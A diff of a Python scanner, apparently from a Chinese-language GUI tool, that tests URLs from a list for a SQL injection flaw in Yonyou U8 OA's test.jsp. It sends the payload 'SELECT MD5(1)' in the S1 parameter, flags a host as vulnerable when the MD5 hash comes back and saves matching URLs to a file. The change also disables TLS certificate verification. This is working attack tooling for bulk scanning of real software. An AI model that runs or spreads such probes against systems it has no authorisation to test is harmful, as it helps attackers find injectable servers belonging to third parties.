@@ -7,9 +7,9 @@ def yyu8_testsql_exp(url):
     poc = r"""/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))"""
     url = url + poc
     try:
-        res = requests.get(url, timeout=3)
+        res = requests.get(url, verify=False,timeout=3)
         if "c4ca4238a0b923820dcc509a6f75849b" in res.text:
-            yyu8_testsql_text.insert(END,"【!!!!!!】存在漏洞的url：" + url + "\n")
+            yyu8_testsql_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
             yyu8_testsql_text.see(END)
             with open ("存在用友U8OAtest_jspSQL注入漏洞的url.txt", 'a') as f:
                 f.write(url + "\n")
@@ -19,7 +19,7 @@ def yyu8_testsql_exp(url):
     except Exception as err:
         yyu8_testsql_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
         yyu8_testsql_text.see(END)
-def get_yyu8_addr():
+def get_yyu8_testsql_addr():
     with open("修正后的url.txt","r") as f:
         for address in f.readlines():
             address = address.strip()
